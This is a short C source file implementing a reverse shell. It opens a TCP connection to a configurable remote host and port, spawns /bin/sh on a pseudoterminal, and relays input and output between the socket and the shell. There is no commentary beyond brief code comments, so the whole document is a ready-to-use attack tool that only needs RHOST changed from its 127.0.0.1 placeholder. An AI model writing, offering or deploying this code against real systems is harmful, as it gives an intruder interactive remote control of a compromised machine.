#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>

#define CONST_IP(a, b, c, d) htonl((a << 24) | (b << 16) | (c << 8) | d)
#define CONST_PORT(x) htons(x)

#define RHOST CONST_IP(127, 0, 0, 1)
#define RPORT CONST_PORT(1337)

static int ptyspawn(char *args[])
{
	int master, slave;

	master = open("/dev/ptmx", O_RDWR);
	grantpt(master);
	unlockpt(master);
	slave = open(ptsname(master), O_RDWR);

	if (!fork()) {
		close(master);
		dup2(slave, STDIN_FILENO);
		dup2(slave, STDOUT_FILENO);
		dup2(slave, STDERR_FILENO);
		close(slave);
		setsid();
		ioctl(0, TIOCSCTTY, 1);
		execve(args[0], args, NULL);
		perror("exec");
		exit(1);
	}

	close(slave);
	return master;
}

int main()
{
	int sock, pty;
	struct sockaddr_in addr;

	fd_set rfds;
	size_t l;
	char buf[4096];

	/* Socket to relay back the output to us */
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	addr.sin_family      = AF_INET;
	addr.sin_port        = RPORT;
	addr.sin_addr.s_addr = RHOST;
	if (-1 == connect(sock, (struct sockaddr *) &addr, sizeof(addr))) {
		perror("connect");
		return 1;
	}
	fcntl(sock, F_SETFL, O_NONBLOCK);

	/* Pseudoterminal for the shell */
	pty = ptyspawn((char *[]) { "/bin/sh", NULL });
	fcntl(pty, F_SETFL, O_NONBLOCK);

	for (;;) {
		FD_ZERO(&rfds);
		FD_SET(pty, &rfds);
		FD_SET(sock, &rfds);
		select(pty > sock ? pty + 1 : sock + 1, &rfds, NULL, NULL, NULL);

		if (FD_ISSET(pty, &rfds)) {
			l = read(pty, buf, sizeof(buf));
			if (-1 == l)
				break;
			if (l > 0)
				write(sock, buf, l);
		}

		if (FD_ISSET(sock, &rfds)) {
			l = read(sock, buf, sizeof(buf));
			if (-1 == l)
				break;
			if (l > 0)
				write(pty, buf, l);
		}
	}
}
